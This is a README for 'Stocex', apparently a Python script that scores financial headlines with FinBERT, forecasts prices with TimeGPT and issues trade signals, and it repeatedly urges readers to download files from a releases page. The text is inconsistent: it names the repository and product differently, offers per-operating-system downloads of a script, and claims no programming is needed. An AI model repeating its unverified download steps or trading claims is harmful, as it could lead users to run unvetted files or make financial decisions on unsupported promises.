# 🧠 Algorithmic-Trading-AI - Simplifying Your Trading Decisions

<p align="center">
  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
    <img src="https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen" alt="Download Now" />
  </a>
</p>

---

## 🧩 What is Stocex?

**Stocex** is a lightweight yet powerful Python script that scans daily financial headlines, scores their sentiment using FinBERT, detects affected stocks, fetches intraday price data, forecasts future prices using TimeGPT, and generates actionable trade signals. 

With Stocex, you can make informed trading decisions with minimal effort. 

---

## ⚙️ How It Works

> 🧠 Just run one script, and everything happens automatically.

### 🔁 Pipeline Overview

1. **Fetch News (via NewsAPI):**  
   Get yesterday’s market headlines from Bloomberg, WSJ, CNBC, and more.

2. **Sentiment Scoring (FinBERT):**  
   Use HuggingFace FinBERT to score each headline as positive, neutral, or negative.

3. **Company Detection (spaCy):**  
   Extract mentioned companies using Named Entity Recognition (NER).

4. **Ticker Mapping:**  
   Match stock tickers to the detected companies, preparing the data for analysis.

5. **Fetch Price Data:**  
   Retrieve intraday prices for the affected stocks to analyze performance.

6. **Forecasting (TimeGPT):**  
   Use historical data to predict future stock prices.

7. **Trade Signals:**  
   Generate actionable trade signals based on sentiment scores and forecasts.

---

## 🚀 Getting Started

To get started with Stocex:

1. Ensure you have **Python 3.7** or higher installed on your computer. You can download it from the [official website](https://www.python.org/downloads/).

2. Download the necessary dependencies. You will need:
   - `requests`
   - `pandas`
   - `spaCy`
   - `huggingface-hub`
   - Install these using the command:   
     ```bash
     pip install requests pandas spacy huggingface-hub
     ```

---

## 📥 Download & Install

To download Stocex, visit the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/releases).

1. Click on the latest version.
2. Download the appropriate version for your operating system.
3. Once downloaded, locate the file on your computer.

---

## ⚙️ Running Stocex

After downloading, follow these steps to run Stocex:

1. Open a terminal or command prompt.
2. Navigate to the folder where you saved the Stocex file.
3. Run the script with the following command:
   ```bash
   python stocex.py
   ```

4. The script will start fetching news, scoring sentiment, and generating trade signals—all automatically.

---

## 🛠️ Features

Stocex offers several important features to assist you:

- **Sentiment Analysis:** Analyze daily financial news to understand market trends.
- **Stock Detection:** Identify which stocks are affected by major headlines.
- **Price Forecasting:** Predict potential price movements, aiding in decision-making.
- **User-Friendly Interface:** Designed for ease of use, no programming skills required.

---

## 📄 License

Stocex is licensed under the MIT License. You can modify and share the code, but attribution is required.

---

## 📚 Frequently Asked Questions (FAQ)

### Q: Do I need to know programming to use Stocex?

A: No, Stocex is designed for users with no programming knowledge. Follow the instructions to get started.

### Q: What if I encounter issues while running the script?

A: Please check the issues section on the [GitHub repository](https://github.com/FluffyFF/Algorithmic-Trading-AI/issues) for help.

### Q: Can I contribute to Stocex?

A: Yes! Contributions are welcome. Feel free to submit pull requests to improve Stocex.

---

## 🌟 Acknowledgments

Stocex leverages the power of various libraries, including NewsAPI, FinBERT, and TimeGPT. Thanks to the communities behind these awesome tools for making them available. 

---

## 📣 Stay Updated

For updates and new features, please keep an eye on the [Release Page](https://github.com/FluffyFF/Algorithmic-Trading-AI/releases).

<p align="center">
  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
    <img src="https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen" alt="Download Now" />
  </a>
</p>